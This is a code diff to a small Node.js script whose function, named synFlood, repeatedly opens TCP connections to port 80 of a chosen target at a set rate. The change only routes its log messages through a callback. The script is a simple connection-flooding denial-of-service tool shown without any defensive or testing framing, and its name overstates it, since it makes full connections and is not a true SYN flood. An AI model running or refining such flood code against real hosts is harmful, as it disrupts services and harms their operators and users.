@@ -1,6 +1,6 @@
 const net = require('net');
 
-function synFlood(target, rateLimit) {
+function synFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const client = new net.Socket();
         client.connect(80, target, () => {
@@ -8,16 +8,16 @@ function synFlood(target, rateLimit) {
         });
 
         client.on('data', (data) => {
-            console.log('Received: ' + data);
+            logOutput('Received: ' + data);
             client.destroy();
         });
 
         client.on('close', () => {
-            console.log('Connection closed');
+            logOutput('Connection closed');
         });
 
         client.on('error', (err) => {
-            console.error('Error: ' + err.message);
+            logOutput('Error: ' + err.message);
         });
     }, 1000 / rateLimit);
 }
